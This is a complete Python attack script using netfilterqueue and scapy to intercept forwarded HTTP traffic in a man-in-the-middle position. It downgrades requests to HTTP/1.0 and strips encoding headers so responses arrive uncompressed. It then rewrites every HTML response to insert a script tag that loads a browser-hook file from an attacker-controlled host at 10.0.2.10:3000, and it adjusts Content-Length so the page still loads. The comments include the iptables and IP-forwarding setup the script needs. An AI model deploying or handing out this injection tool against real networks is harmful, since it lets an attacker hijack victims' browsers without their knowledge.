#!/usr/bin/env python3

# iptables -I FORWARD -j NFQUEUE --queue-num 0 (Remote Device)
# iptables -I OUTPUT -j NFQUEUE --queue-num 0 (Local testing)
# iptables -I INPUT -j NFQUEUE --queue-num 0 (Local testing)
# iptables --flush
# echo 1 > /proc/sys/net/ipv4/ip_forward

# TODO: automate the iptable configuration, depending on args. (local, or remote)
# When done, clear the iptables entries added

import netfilterqueue
import scapy.all as scapy
import re


def setPayload(packet, load):

	packet[scapy.Raw].load = load

	packet[scapy.IP].len = None
	packet[scapy.IP].chksum = None
	packet[scapy.TCP].chksum = None

	return packet


def decodePayload(payload):

	try:
		decoded = payload.decode()
	except Exception as e:
		return None

	return decoded


def processPacket(packet):

	s_packet = scapy.IP(packet.get_payload())

	if (s_packet.haslayer(scapy.Raw) and s_packet.haslayer(scapy.TCP)):

		# Accepting the packet by default if we cannot convert it to str()
		decoded_payload = decodePayload(s_packet[scapy.Raw].load)
		payload = None

		if (not decoded_payload):
			packet.accept()
			return

		if (s_packet[scapy.TCP].dport == 80):

			print('[+] HTTP Request detected')

			# Removing any specific encodings in the HTTP Request, and creating new a new payload
			payload = re.sub('Accept-Encoding:[\\s\\S]*?\\r\\n', '', decoded_payload)
			payload = payload.replace('HTTP/1.1', 'HTTP/1.0')

			#print(s_packet.show())

		elif (s_packet[scapy.TCP].sport == 80):

			print('[+] HTTP Response detected')

			#print('HTML Decoded Response Payload: {0}'.format(decoded_payload))

			str_inject = '<script src="http://10.0.2.10:3000/hook.js"></script>'
			payload = decoded_payload.replace('</body>', str_inject + '</body>')

			if ('Content-Length' and 'text/html' in payload):

				try:
					content_length = int(re.search('Content-Length: (\\d+)\\r\\n', payload).group(1))

				except Exception as e:
					content_length = 0

				payload = re.sub('Content-Length:.*\\r\\n', 'Content-Length: ' + str(content_length + len(str_inject)) + '\\r\\n', payload)

				if (str_inject in payload):
					print('[+] Code injected!')

				#print('HTML Modified Payload: {0}'.format(decoded_payload))

			#print(s_packet.show())

		if (payload != s_packet[scapy.Raw].load):
			packet.set_payload(bytes(setPayload(s_packet, payload)))
			
	packet.accept()


if __name__ == '__main__':

	# Verify if iptables rules are set/active
	print('[?] Hint: Please ensure that your iptables forward rules are set!')
	print('[+] Interception in ON..')

	queue = netfilterqueue.NetfilterQueue()
	queue.bind(0, processPacket)
	queue.run()
	
